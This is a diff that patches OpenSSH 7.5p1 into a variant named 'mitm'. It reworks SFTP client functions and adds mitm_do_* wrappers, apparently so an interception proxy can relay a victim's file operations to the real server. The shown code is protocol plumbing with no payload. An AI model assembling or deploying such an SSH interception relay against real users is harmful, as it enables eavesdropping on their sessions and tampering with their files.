diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.c openssh-7.5p1-mitm/sftp-client.c
--- openssh-7.5p1/sftp-client.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-client.c	2017-07-12 12:17:14.159320238 -0400
@@ -74,6 +74,7 @@
 # define SFTP_DIRECTORY_CHARS      "/"
 #endif /* HAVE_CYGWIN */
 
+/*
 struct sftp_conn {
 	int fd_in;
 	int fd_out;
@@ -90,10 +91,13 @@
 	u_int64_t limit_kbps;
 	struct bwlimit bwlimit_in, bwlimit_out;
 };
+*/
+struct sftp_conn *client_conn = NULL;
+
 
 static u_char *
-get_handle(struct sftp_conn *conn, u_int expected_id, size_t *len,
-    const char *errfmt, ...) __attribute__((format(printf, 4, 5)));
+get_handle(struct sftp_conn *conn, u_int expected_id, u_int *status, size_t *len,
+    const char *errfmt, ...) __attribute__((format(printf, 5, 6)));
 
 /* ARGSUSED */
 static int
@@ -231,11 +235,11 @@
 }
 
 static u_char *
-get_handle(struct sftp_conn *conn, u_int expected_id, size_t *len,
+get_handle(struct sftp_conn *conn, u_int expected_id, u_int *status, size_t *len,
     const char *errfmt, ...)
 {
 	struct sshbuf *msg;
-	u_int id, status;
+	u_int id;
 	u_char type;
 	u_char *handle;
 	char errmsg[256];
@@ -258,10 +262,10 @@
 		fatal("%s: ID mismatch (%u != %u)",
 		    errfmt == NULL ? __func__ : errmsg, id, expected_id);
 	if (type == SSH2_FXP_STATUS) {
-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
 		if (errfmt != NULL)
-			error("%s: %s", errmsg, fx2txt(status));
+			error("%s: %s", errmsg, fx2txt(*status));
 		sshbuf_free(msg);
 		return(NULL);
 	} else if (type != SSH2_FXP_HANDLE)
@@ -276,7 +280,7 @@
 }
 
 static Attrib *
-get_decode_stat(struct sftp_conn *conn, u_int expected_id, int quiet)
+get_decode_stat(struct sftp_conn *conn, u_int expected_id, int quiet, u_int *status)
 {
 	struct sshbuf *msg;
 	u_int id;
@@ -296,14 +300,13 @@
 	if (id != expected_id)
 		fatal("ID mismatch (%u != %u)", id, expected_id);
 	if (type == SSH2_FXP_STATUS) {
-		u_int status;
 
-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
 		if (quiet)
-			debug("Couldn't stat remote file: %s", fx2txt(status));
+			debug("Couldn't stat remote file: %s", fx2txt(*status));
 		else
-			error("Couldn't stat remote file: %s", fx2txt(status));
+			error("Couldn't stat remote file: %s", fx2txt(*status));
 		sshbuf_free(msg);
 		return(NULL);
 	} else if (type != SSH2_FXP_ATTRS) {
@@ -322,7 +325,7 @@
 
 static int
 get_decode_statvfs(struct sftp_conn *conn, struct sftp_statvfs *st,
-    u_int expected_id, int quiet)
+    u_int expected_id, int quiet, u_int *status)
 {
 	struct sshbuf *msg;
 	u_char type;
@@ -342,14 +345,12 @@
 	if (id != expected_id)
 		fatal("ID mismatch (%u != %u)", id, expected_id);
 	if (type == SSH2_FXP_STATUS) {
-		u_int status;
-
-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
 		if (quiet)
-			debug("Couldn't statvfs: %s", fx2txt(status));
+			debug("Couldn't statvfs: %s", fx2txt(*status));
 		else
-			error("Couldn't statvfs: %s", fx2txt(status));
+			error("Couldn't statvfs: %s", fx2txt(*status));
 		sshbuf_free(msg);
 		return -1;
 	} else if (type != SSH2_FXP_EXTENDED_REPLY) {
@@ -523,7 +524,7 @@
 	u_int count, id, i, expected_id, ents = 0;
 	size_t handle_len;
 	u_char type, *handle;
-	int status = SSH2_FX_FAILURE;
+	int status = SSH2_FX_FAILURE, status_ret;
 	int r;
 
 	if (dir)
@@ -539,7 +540,7 @@
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 	send_msg(conn, msg);
 
-	handle = get_handle(conn, id, &handle_len,
+	handle = get_handle(conn, id, &status_ret, &handle_len,
 	    "remote readdir(\"%s\")", path);
 	if (handle == NULL) {
 		sshbuf_free(msg);
@@ -730,7 +731,7 @@
 }
 
 Attrib *
-do_stat(struct sftp_conn *conn, const char *path, int quiet)
+do_stat(struct sftp_conn *conn, const char *path, int quiet, u_int *status)
 {
 	u_int id;
 
@@ -740,11 +741,11 @@
 	    conn->version == 0 ? SSH2_FXP_STAT_VERSION_0 : SSH2_FXP_STAT,
 	    path, strlen(path));
 
-	return(get_decode_stat(conn, id, quiet));
+	return(get_decode_stat(conn, id, quiet, status));
 }
 
 Attrib *
-do_lstat(struct sftp_conn *conn, const char *path, int quiet)
+do_lstat(struct sftp_conn *conn, const char *path, int quiet, u_int *status)
 {
 	u_int id;
 
@@ -753,20 +754,20 @@
 			debug("Server version does not support lstat operation");
 		else
 			logit("Server version does not support lstat operation");
-		return(do_stat(conn, path, quiet));
+		return(do_stat(conn, path, quiet, status));
 	}
 
 	id = conn->msg_id++;
 	send_string_request(conn, id, SSH2_FXP_LSTAT, path,
 	    strlen(path));
 
-	return(get_decode_stat(conn, id, quiet));
+	return(get_decode_stat(conn, id, quiet, status));
 }
 
 #ifdef notyet
 Attrib *
 do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len,
-    int quiet)
+    int quiet, u_int *status)
 {
 	u_int id;
 
@@ -774,7 +775,7 @@
 	send_string_request(conn, id, SSH2_FXP_FSTAT, handle,
 	    handle_len);
 
-	return(get_decode_stat(conn, id, quiet));
+	return(get_decode_stat(conn, id, quiet, status));
 }
 #endif
 
@@ -1076,6 +1077,7 @@
 	struct sshbuf *msg;
 	u_int id;
 	int r;
+	u_int status;
 
 	if ((conn->exts & SFTP_EXT_STATVFS) == 0) {
 		error("Server does not support statvfs@openssh.com extension");
@@ -1095,7 +1097,7 @@
 	send_msg(conn, msg);
 	sshbuf_free(msg);
 
-	return get_decode_statvfs(conn, st, id, quiet);
+	return get_decode_statvfs(conn, st, id, quiet, &status);
 }
 
 #ifdef notyet
@@ -1105,6 +1107,7 @@
 {
 	struct sshbuf *msg;
 	u_int id;
+	u_int status;
 
 	if ((conn->exts & SFTP_EXT_FSTATVFS) == 0) {
 		error("Server does not support fstatvfs@openssh.com extension");
@@ -1124,7 +1127,7 @@
 	send_msg(conn, msg);
 	sshbuf_free(msg);
 
-	return get_decode_statvfs(conn, st, id, quiet);
+	return get_decode_statvfs(conn, st, id, quiet, &status);
 }
 #endif
 
@@ -1172,10 +1175,11 @@
 	TAILQ_HEAD(reqhead, request) requests;
 	struct request *req;
 	u_char type;
+	u_int status_ret;
 
 	TAILQ_INIT(&requests);
 
-	if (a == NULL && (a = do_stat(conn, remote_path, 0)) == NULL)
+	if (a == NULL && (a = do_stat(conn, remote_path, 0, &status_ret)) == NULL)
 		return -1;
 
 	/* Do not preserve set[ug]id here, as we do not preserve ownership */
@@ -1212,7 +1216,7 @@
 	send_msg(conn, msg);
 	debug3("Sent message SSH2_FXP_OPEN I:%u P:%s", id, remote_path);
 
-	handle = get_handle(conn, id, &handle_len,
+	handle = get_handle(conn, id, &status_ret, &handle_len,
 	    "remote open(\"%s\")", remote_path);
 	if (handle == NULL) {
 		sshbuf_free(msg);
@@ -1453,6 +1457,7 @@
 	SFTP_DIRENT **dir_entries;
 	char *filename, *new_src, *new_dst;
 	mode_t mode = 0777;
+	u_int status_ret;
 
 	if (depth >= MAX_DIR_DEPTH) {
 		error("Maximum directory depth exceeded: %d levels", depth);
@@ -1460,7 +1465,7 @@
 	}
 
 	if (dirattrib == NULL &&
-	    (dirattrib = do_stat(conn, src, 1)) == NULL) {
+	    (dirattrib = do_stat(conn, src, 1, &status_ret)) == NULL) {
 		error("Unable to stat remote directory \"%s\"", src);
 		return -1;
 	}
@@ -1579,6 +1584,7 @@
 	TAILQ_HEAD(ackhead, outstanding_ack) acks;
 	struct outstanding_ack *ack = NULL;
 	size_t handle_len;
+	int status_ret;
 
 	TAILQ_INIT(&acks);
 
@@ -1607,8 +1613,9 @@
 		a.flags &= ~SSH2_FILEXFER_ATTR_ACMODTIME;
 
 	if (resume) {
+	  u_int status_ret2;
 		/* Get remote file size if it exists */
-		if ((c = do_stat(conn, remote_path, 0)) == NULL) {
+		if ((c = do_stat(conn, remote_path, 0, &status_ret2)) == NULL) {
 			close(local_fd);
 			return -1;
 		}
@@ -1643,7 +1650,7 @@
 
 	sshbuf_reset(msg);
 
-	handle = get_handle(conn, id, &handle_len,
+	handle = get_handle(conn, id, &status_ret, &handle_len,
 	    "remote open(\"%s\")", remote_path);
 	if (handle == NULL) {
 		close(local_fd);
@@ -1818,7 +1825,8 @@
 	 * the path already existed and is a directory.
 	 */
 	if (do_mkdir(conn, dst, &a, 0) != 0) {
-		if ((dirattrib = do_stat(conn, dst, 0)) == NULL)
+		u_int status_ret;
+		if ((dirattrib = do_stat(conn, dst, 0, &status_ret)) == NULL)
 			return -1;
 		if (!S_ISDIR(dirattrib->perm)) {
 			error("\"%s\" exists but is not a directory", dst);
@@ -1904,3 +1912,424 @@
 	return(ret);
 }
 
+u_char *
+mitm_do_opendir(struct sftp_conn *conn, const char *path, size_t *handle_len, int *status)
+{
+	struct sshbuf *msg;
+	u_int id;
+	u_char *handle;
+	int r;
+
+	id = conn->msg_id++;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_OPENDIR)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, path)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+
+	handle = get_handle(conn, id, status, handle_len,
+	    "remote opendir(\"%s\")", path);
+	sshbuf_free(msg);
+	return handle;
+}
+
+Stat *
+mitm_do_readdir(struct sftp_conn *conn, u_int32_t id, u_char *handle_str, size_t handle_len, u_int *count, int *status) {
+	struct sshbuf *msg;
+	Stat *ret;
+	int r;
+	u_char type;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_READDIR)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_string(msg, handle_str, handle_len)) != 0)
+	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	send_msg(conn, msg);
+	sshbuf_reset(msg);
+	get_msg(conn, msg);
+	if ((r = sshbuf_get_u8(msg, &type)) != 0 ||
+	    (r = sshbuf_get_u32(msg, &id)) != 0)
+	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("Received reply T:%u I:%u", type, id);
+	
+	if (type == SSH2_FXP_STATUS) {
+	  u_int rstatus;
+	  
+	  if ((r = sshbuf_get_u32(msg, &rstatus)) != 0)
+	    fatal("%s: buffer error: %s",
+		  __func__, ssh_err(r));
+	  debug3("Received SSH2_FXP_STATUS %d", rstatus);
+
+	  sshbuf_free(msg); msg = NULL;
+	  *status = rstatus;
+	  return NULL;
+	} else if (type != SSH2_FXP_NAME)
+	  fatal("Expected SSH2_FXP_NAME(%u) packet, got %u",
+		SSH2_FXP_NAME, type);
+
+	if ((r = sshbuf_get_u32(msg, count)) != 0)
+	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	if (*count > SSHBUF_SIZE_MAX)
+	  fatal("%s: nonsensical number of entries", __func__);
+	if (*count == 0) {
+	  sshbuf_free(msg); msg = NULL;
+	  *status = SSH2_FX_EOF;
+	  return NULL;
+	}
+
+	debug3("Received %d SSH2_FXP_NAME responses", *count);
+
+	ret = xcalloc(*count, sizeof(Stat));
+
+	for (u_int i = 0; i < *count; i++) {
+	  char *name, *long_name;
+	  Attrib a;
+
+	  if ((r = sshbuf_get_cstring(msg, &name, NULL)) != 0 ||
+	      (r = sshbuf_get_cstring(msg, &long_name, NULL)) != 0)
+	    fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	  if ((r = decode_attrib(msg, &a)) != 0) {
+	    free(name); name = NULL;
+	    free(long_name); long_name = NULL;
+	    sshbuf_free(msg); msg = NULL;
+	    *status = SSH2_FX_FAILURE;
+	    return NULL;
+	  }
+	  ret[i].name = name;
+	  ret[i].long_name = long_name;
+	  ret[i].attrib = a;
+	}
+	return ret;
+}
+
+u_int
+mitm_do_close(struct sftp_conn *conn, const u_char *handle, u_int handle_len)
+{
+	u_int id;
+	struct sshbuf *msg;
+	int r;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_CLOSE)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_string(msg, handle, handle_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	sshbuf_free(msg);
+
+	debug3("Sent message SSH2_FXP_CLOSE I:%u", id);
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_mkdir(struct sftp_conn *conn, const char *path, Attrib *a)
+{
+	u_int id;
+
+	id = conn->msg_id++;
+	send_string_attrs_request(conn, id, SSH2_FXP_MKDIR, path, strlen(path), a);
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_rmdir(struct sftp_conn *conn, const char *path)
+{
+	u_int id;
+
+	id = conn->msg_id++;
+	send_string_request(conn, id, SSH2_FXP_RMDIR, path, strlen(path));
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_rm(struct sftp_conn *conn, const char *path)
+{
+	u_int id;
+
+	id = conn->msg_id++;
+	send_string_request(conn, id, SSH2_FXP_REMOVE, path, strlen(path));
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_rename(struct sftp_conn *conn, const char *oldpath, const char *newpath, int force_legacy)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r, use_ext = (conn->exts & SFTP_EXT_POSIX_RENAME) && !force_legacy;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	/* Send rename request */
+	id = conn->msg_id++;
+	if (use_ext) {
+		if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+		    (r = sshbuf_put_u32(msg, id)) != 0 ||
+		    (r = sshbuf_put_cstring(msg,
+		    "posix-rename@openssh.com")) != 0)
+			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	} else {
+		if ((r = sshbuf_put_u8(msg, SSH2_FXP_RENAME)) != 0 ||
+		    (r = sshbuf_put_u32(msg, id)) != 0)
+			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	}
+	if ((r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message %s \"%s\" -> \"%s\"",
+	    use_ext ? "posix-rename@openssh.com" :
+	    "SSH2_FXP_RENAME", oldpath, newpath);
+	sshbuf_free(msg);
+
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_setstat(struct sftp_conn *conn, const char *path, Attrib *a)
+{
+	u_int id = conn->msg_id++;
+	send_string_attrs_request(conn, id, SSH2_FXP_SETSTAT, path, strlen(path), a);
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_fsetstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, Attrib *a)
+{
+	u_int id = conn->msg_id++;
+	send_string_attrs_request(conn, id, SSH2_FXP_FSETSTAT, handle, handle_len, a);
+	return get_status(conn, id);
+}
+
+Attrib *
+mitm_do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, int quiet, u_int *status)
+{
+	u_int id = conn->msg_id++;
+	send_string_request(conn, id, SSH2_FXP_FSTAT, handle, handle_len);
+	return(get_decode_stat(conn, id, quiet, status));
+}
+
+/* Returns 1 on success, with "filename", "longname", and "a" args set to the values obtained, or 0 on failure, with "status" arg set. */
+int
+mitm_do_readlink(struct sftp_conn *conn, const char *path, u_int *status, char **filename, char **longname, Attrib *a)
+{
+	struct sshbuf *msg;
+	u_int expected_id, count, id;
+	u_char type;
+	int r;
+
+	expected_id = id = conn->msg_id++;
+	send_string_request(conn, id, SSH2_FXP_READLINK, path, strlen(path));
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	get_msg(conn, msg);
+	if ((r = sshbuf_get_u8(msg, &type)) != 0 ||
+	    (r = sshbuf_get_u32(msg, &id)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	if (id != expected_id)
+		fatal("ID mismatch (%u != %u)", id, expected_id);
+
+	if (type == SSH2_FXP_STATUS) {
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
+			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+		sshbuf_free(msg);
+		return 0;
+	} else if (type != SSH2_FXP_NAME)
+		fatal("Expected SSH2_FXP_NAME(%u) packet, got %u",
+		    SSH2_FXP_NAME, type);
+
+	if ((r = sshbuf_get_u32(msg, &count)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	if (count != 1)
+		fatal("Got multiple names (%d) from SSH_FXP_READLINK", count);
+
+	if ((r = sshbuf_get_cstring(msg, filename, NULL)) != 0 ||
+	    (r = sshbuf_get_cstring(msg, longname, NULL)) != 0 ||
+	    (r = decode_attrib(msg, a)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("SSH_FXP_READLINK %s -> %s", path, *filename);
+	sshbuf_free(msg);
+	return 1;
+}
+
+u_int
+mitm_do_symlink(struct sftp_conn *conn, const char *oldpath, const char *newpath)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+
+	if (conn->version < 3)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	/* Send symlink request */
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_SYMLINK)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message SSH2_FXP_SYMLINK \"%s\" -> \"%s\"", oldpath,
+	    newpath);
+	sshbuf_free(msg);
+
+	return get_status(conn, id);
+}
+
+int
+mitm_do_statvfs(struct sftp_conn *conn, const char *path, struct statvfs *st, u_int *status)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+	struct sftp_statvfs sftp_st;
+
+	if ((conn->exts & SFTP_EXT_STATVFS) == 0)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	id = conn->msg_id++;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	sshbuf_reset(msg);
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, "statvfs@openssh.com")) != 0 ||
+	    (r = sshbuf_put_cstring(msg, path)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	sshbuf_free(msg);
+
+	if (get_decode_statvfs(conn, &sftp_st, id, 1, status) == -1)
+	  return -1;
+
+	st->f_bsize = sftp_st.f_bsize;
+	st->f_frsize = sftp_st.f_frsize;
+	st->f_blocks = sftp_st.f_blocks;
+	st->f_bfree = sftp_st.f_bfree;
+	st->f_bavail = sftp_st.f_bavail;
+	st->f_files = sftp_st.f_files;
+	st->f_ffree = sftp_st.f_ffree;
+	st->f_favail = sftp_st.f_favail;
+	st->f_fsid = sftp_st.f_fsid;
+	st->f_flag = sftp_st.f_flag;
+	st->f_namemax = sftp_st.f_namemax;
+	return 1;
+}
+
+int
+mitm_do_fstatvfs(struct sftp_conn *conn, const u_char *handle, size_t handle_len, struct statvfs *st, u_int *status)
+{
+	struct sshbuf *msg;
+	int r;
+	u_int id;
+	struct sftp_statvfs sftp_st;
+
+	if ((conn->exts & SFTP_EXT_FSTATVFS) == 0)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	id = conn->msg_id++;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	sshbuf_reset(msg);
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, "fstatvfs@openssh.com")) != 0 ||
+	    (r = sshbuf_put_string(msg, handle, (u_int)handle_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	sshbuf_free(msg);
+
+	if (get_decode_statvfs(conn, &sftp_st, id, 1, status) == -1)
+	  return -1;
+
+	st->f_bsize = sftp_st.f_bsize;
+	st->f_frsize = sftp_st.f_frsize;
+	st->f_blocks = sftp_st.f_blocks;
+	st->f_bfree = sftp_st.f_bfree;
+	st->f_bavail = sftp_st.f_bavail;
+	st->f_files = sftp_st.f_files;
+	st->f_ffree = sftp_st.f_ffree;
+	st->f_favail = sftp_st.f_favail;
+	st->f_fsid = sftp_st.f_fsid;
+	st->f_flag = sftp_st.f_flag;
+	st->f_namemax = sftp_st.f_namemax;
+	return 1;
+}
+
+u_int
+mitm_do_hardlink(struct sftp_conn *conn, const char *oldpath, const char *newpath)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+
+	if ((conn->exts & SFTP_EXT_HARDLINK) == 0)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	/* Send link request */
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, "hardlink@openssh.com")) != 0 ||
+	    (r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message hardlink@openssh.com \"%s\" -> \"%s\"",
+	       oldpath, newpath);
+	sshbuf_free(msg);
+
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_fsync(struct sftp_conn *conn, u_char *handle, size_t handle_len)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+
+	/* Silently return if the extension is not supported */
+	if ((conn->exts & SFTP_EXT_FSYNC) == 0)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	/* Send fsync request */
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, "fsync@openssh.com")) != 0 ||
+	    (r = sshbuf_put_string(msg, handle, (u_int)handle_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message fsync@openssh.com I:%u", id);
+	sshbuf_free(msg);
+
+	return get_status(conn, id);
+}
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.h openssh-7.5p1-mitm/sftp-client.h
--- openssh-7.5p1/sftp-client.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-client.h	2017-07-12 12:19:20.310726952 -0400
@@ -21,6 +21,9 @@
 #ifndef _SFTP_CLIENT_H
 #define _SFTP_CLIENT_H
 
+#include <sys/statvfs.h>
+#include "misc.h"
+
 #ifdef USE_SYSTEM_GLOB
 # include <glob.h>
 #else
@@ -53,6 +56,23 @@
 	u_int64_t f_namemax;
 };
 
+struct sftp_conn {
+	int fd_in;
+	int fd_out;
+	u_int transfer_buflen;
+	u_int num_requests;
+	u_int version;
+	u_int msg_id;
+#define SFTP_EXT_POSIX_RENAME	0x00000001
+#define SFTP_EXT_STATVFS	0x00000002
+#define SFTP_EXT_FSTATVFS	0x00000004
+#define SFTP_EXT_HARDLINK	0x00000008
+#define SFTP_EXT_FSYNC		0x00000010
+	u_int exts;
+	u_int64_t limit_kbps;
+	struct bwlimit bwlimit_in, bwlimit_out;
+};
+
 /*
  * Initialise a SSH filexfer connection. Returns NULL on error or
  * a pointer to a initialized sftp_conn struct on success.
@@ -80,10 +100,10 @@
 int do_rmdir(struct sftp_conn *, const char *);
 
 /* Get file attributes of 'path' (follows symlinks) */
-Attrib *do_stat(struct sftp_conn *, const char *, int);
+Attrib *do_stat(struct sftp_conn *, const char *, int, u_int *);
 
 /* Get file attributes of 'path' (does not follow symlinks) */
-Attrib *do_lstat(struct sftp_conn *, const char *, int);
+Attrib *do_lstat(struct sftp_conn *, const char *, int, u_int *);
 
 /* Set file attributes of 'path' */
 int do_setstat(struct sftp_conn *, const char *, Attrib *);
@@ -139,4 +159,36 @@
 /* Concatenate paths, taking care of slashes. Caller must free result. */
 char *path_append(const char *, const char *);
 
+u_int mitm_do_close(struct sftp_conn *conn, const u_char *handle, u_int handle_len);
+
+u_int mitm_do_fsetstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, Attrib *a);
+
+Attrib *mitm_do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, int quiet, u_int *status);
+
+int mitm_do_fstatvfs(struct sftp_conn *conn, const u_char *handle, size_t handle_len, struct statvfs *st, u_int *status);
+
+u_int mitm_do_fsync(struct sftp_conn *conn, u_char *handle, size_t handle_len);
+
+u_int mitm_do_hardlink(struct sftp_conn *conn, const char *oldpath, const char *newpath);
+
+u_int mitm_do_mkdir(struct sftp_conn *conn, const char *path, Attrib *a);
+
+u_char *mitm_do_opendir(struct sftp_conn *conn, const char *path, size_t *handle_len, int *status);
+
+Stat *mitm_do_readdir(struct sftp_conn *conn, u_int32_t id, u_char *handle_str, size_t handle_len, u_int *count, int *status);
+
+int mitm_do_readlink(struct sftp_conn *conn, const char *path, u_int *status, char **filename, char **longname, Attrib *a);
+
+u_int mitm_do_rename(struct sftp_conn *conn, const char *oldpath, const char *newpath, int force_legacy);
+
+u_int mitm_do_rmdir(struct sftp_conn *conn, const char *path);
+
+u_int mitm_do_rm(struct sftp_conn *conn, const char *path);
+
+u_int mitm_do_setstat(struct sftp_conn *conn, const char *path, Attrib *a);
+
+int mitm_do_statvfs(struct sftp_conn *conn, const char *path, struct statvfs *st, u_int *status);
+
+u_int mitm_do_symlink(struct sftp_conn *conn, const char *oldpath, const char *newpath);
+
 #endif
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-common.h openssh-7.5p1-mitm/sftp-common.h
--- openssh-7.5p1/sftp-common.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-common.h	2017-07-07 13:08:46.225251440 -0400
@@ -50,3 +50,12 @@
 char	*ls_file(const char *, const struct stat *, int, int);
 
 const char *fx2txt(int);
+
+/* portable attributes, etc. */
+typedef struct Stat Stat;
+
+struct Stat {
+	char *name;
+	char *long_name;
+	Attrib attrib;
+};
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-glob.c openssh-7.5p1-mitm/sftp-glob.c
--- openssh-7.5p1/sftp-glob.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-glob.c	2017-07-07 15:51:57.651427070 -0400
@@ -111,8 +111,9 @@
 fudge_lstat(const char *path, struct stat *st)
 {
 	Attrib *a;
+	u_int status;
 
-	if (!(a = do_lstat(cur.conn, (char *)path, 1)))
+	if (!(a = do_lstat(cur.conn, (char *)path, 1, &status)))
 		return(-1);
 
 	attrib_to_stat(a, st);
@@ -124,8 +125,9 @@
 fudge_stat(const char *path, struct stat *st)
 {
 	Attrib *a;
+	u_int status;
 
-	if (!(a = do_stat(cur.conn, (char *)path, 1)))
+	if (!(a = do_stat(cur.conn, (char *)path, 1, &status)))
 		return(-1);
 
 	attrib_to_stat(a, st);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.h openssh-7.5p1-mitm/sftp.h
--- openssh-7.5p1/sftp.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp.h	2017-07-06 14:11:25.389016830 -0400
@@ -97,5 +97,5 @@
 
 struct passwd;
 
-int	sftp_server_main(int, char **, struct passwd *);
+int	sftp_server_main(int, char **, struct passwd *, char *, unsigned short, char *, char *);
